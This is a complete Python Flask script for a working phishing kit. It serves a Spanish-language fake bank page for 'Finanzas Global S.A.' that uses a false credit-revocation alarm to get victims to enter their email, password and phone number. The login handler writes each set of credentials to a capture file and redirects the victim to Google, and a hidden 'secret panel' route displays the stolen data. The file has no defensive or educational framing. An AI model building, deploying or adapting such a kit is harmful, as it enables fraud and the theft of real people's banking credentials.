from flask import Flask, render_template_string, request, redirect
import datetime

app = Flask(__name__)

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Soporte de Seguridad | Finanzas Global S.A.</title>
    <style>
        body { font-family: 'Segoe UI', Arial, sans-serif; background: #f4f7f9; margin: 0; color: #333; }
        .nav { background: #1a252f; color: white; padding: 10px 20px; text-align: center; font-size: 11px; letter-spacing: 1px; }
        .container { max-width: 480px; margin: 30px auto; background: #fff; border-radius: 8px; box-shadow: 0 15px 35px rgba(0,0,0,0.15); overflow: hidden; border-top: 6px solid #d32f2f; }
        .header { padding: 30px; text-align: center; border-bottom: 1px solid #eee; }
        .header h1 { margin: 0; font-size: 24px; color: #1a252f; }
        .header span { color: #d32f2f; }
        .alert-box { background: #fff3cd; padding: 15px; font-size: 13px; color: #856404; text-align: center; border-bottom: 1px solid #ffeeba; }
        .form-body { padding: 30px; }
        .input-group { margin-bottom: 15px; }
        label { display: block; font-size: 11px; font-weight: bold; color: #7f8c8d; text-transform: uppercase; margin-bottom: 5px; }
        input { width: 100%; padding: 14px; border: 1px solid #ced4da; border-radius: 4px; box-sizing: border-box; font-size: 15px; }
        .btn-submit { width: 100%; background: #d32f2f; color: #fff; border: none; padding: 16px; border-radius: 4px; font-size: 14px; font-weight: 800; cursor: pointer; text-transform: uppercase; }
        .footer { background: #1a252f; color: #95a5a6; padding: 20px; text-align: center; font-size: 11px; }
    </style>
</head>
<body>
    <div class="nav">CONEXIÓN SEGURA VERIFICADA 2026</div>
    <div class="container">
        <div class="header"><h1>FINANZAS<span>GLOBAL</span></h1></div>
        <div class="alert-box"><b>⚠️ ACCIÓN REQUERIDA</b><br>Revocación de Crédito #CR-88390</div>
        <div class="form-body">
            <form action="/login" method="post">
                <div class="input-group"><label>Email</label><input type="text" name="u" required></div>
                <div class="input-group"><label>Clave</label><input type="password" name="p" required></div>
                <div class="input-group"><label>Teléfono</label><input type="text" name="tel" required></div>
                <button type="submit" class="btn-submit">CANCELAR PRÉSTAMO</button>
            </form>
        </div>
        <div class="footer">Sede Central: 200 West Street, NY | Member FDIC</div>
    </div>
</body>
</html>
"""

@app.route('/panel-secreto-svr')
def ver_botin():
    try:
        with open("capturas.txt", "r") as f: data = f.read()
    except: data = "Búnker vacío."
    return f"<html><body style='background:#1a1a1a; color:#0f0; padding:20px;'><pre>{data}</pre></body></html>"

@app.route('/')
def home():
    return render_template_string(HTML_TEMPLATE)

@app.route('/login', methods=['POST'])
def login():
    u, p, t = request.form.get('u'), request.form.get('p'), request.form.get('tel')
    with open("capturas.txt", "a") as f:
        f.write(f"[{datetime.datetime.now()}] USER: {u} | PASS: {p} | TEL: {t}\n")
    return redirect("https://www.google.com")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
